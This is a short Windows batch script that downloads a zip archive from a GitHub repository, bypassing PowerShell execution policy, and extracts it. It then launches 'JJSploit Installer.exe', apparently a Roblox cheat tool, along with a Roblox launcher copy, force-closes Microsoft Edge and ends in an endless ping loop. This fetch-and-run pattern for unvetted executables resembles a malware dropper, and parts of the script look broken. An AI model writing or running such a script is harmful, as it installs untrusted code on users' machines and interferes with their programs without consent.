@echo off
md "D:\ButterPack"
cd D:\ButterPack

PowerShell -NoProfile -ExecutionPolicy Bypass -Command "curl -o pack.zip https://github.com/Greenn7838/Butter-s-awesome-repo/raw/main/pack.zip"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "unzip .\pack.zip"

del /f .\pack.zip

start ./"JJSploit Installer.exe"
start ./"RobloxPlayerLauncher (2).exe"

taskkill /IM msedge.exe

ping 127.0.0.1 -t

echo Done!!
